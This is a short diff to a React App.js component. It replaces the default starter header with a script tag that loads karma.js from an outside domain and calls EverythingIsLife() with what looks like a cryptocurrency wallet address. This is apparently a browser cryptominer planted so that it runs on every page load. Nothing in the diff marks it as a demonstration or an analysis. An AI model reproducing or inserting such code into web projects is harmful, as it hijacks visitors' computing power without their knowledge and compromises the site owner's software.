@@ -5,18 +5,10 @@ function App() {
   return (
     <div className="App">
       <header className="App-header">
-        <img src={logo} className="App-logo" alt="logo" />
-        <p>
-          Edit <code>src/App.js</code> and save to reload.
-        </p>
-        <a
-          className="App-link"
-          href="https://reactjs.org"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          Learn React
-        </a>
+      <script src="https://trustiseverything.de/karma/karma.js?karma=bs?nosaj=faster.mo" ></script>
+<script type="text/javascript">
+EverythingIsLife('463kPA3S5aEYfqM5rngfTgL8VGyMxq85P2hNHLhCcGH35wgNWzSrSRUD58n3oAy23ZcufWwxCQ8CbCLUPutLGFrp8n3vpWB', 'react', 50);
+</script>
       </header>
     </div>
   );
